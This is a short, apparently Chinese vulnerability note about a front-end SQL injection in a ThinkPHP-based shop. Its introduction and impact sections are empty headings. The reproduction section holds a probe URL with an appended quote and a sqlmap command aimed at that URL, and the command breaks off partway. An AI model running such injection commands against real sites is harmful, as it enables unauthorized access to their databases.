Thinkphp Shop前台SQL注入
========================

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

<http://www.0-sec.org/mobile/index/index2/id/1>\'

sqlmap -u \"<http://www.0-sec.org/mobile/index/index2/id/1*>\"
\--random-agent \--batch \--dbms \"mysql\" \--
